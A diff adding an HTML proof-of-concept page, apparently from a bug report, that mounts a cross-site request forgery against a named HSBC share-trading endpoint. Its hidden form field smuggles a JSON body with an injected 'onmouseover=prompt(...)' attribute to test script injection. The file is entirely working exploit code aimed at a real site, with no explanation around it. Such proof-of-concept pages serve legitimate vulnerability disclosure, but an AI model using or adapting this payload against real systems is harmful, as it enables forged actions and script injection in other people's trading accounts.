@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC - HSBC Share Trading</title>
+    <meta name="referrer" content="unsafe-url">
+</head>
+<body>
+    <h2>CSRF PoC</h2>
+
+    <form
+        action="https://www.sharetrading.hsbc.com.au/ajaxpro/TPP.Website.AJAX.AllAjax,TPP.Website.ashx"
+        method="POST"
+        enctype="text/plain"
+        referrerpolicy="unsafe-url">
+
+        <input type="hidden"
+            name='{"type":0,"typeID":"0 onmouseover=prompt(96096) y","areaField":0,"colorField":1,"width":0,"height":0,"groups":"","showControls":true,"x":"'
+            value='"}'>
+
+        <input type="submit" value="Execute CSRF">
+    </form>
+</body>
+</html>
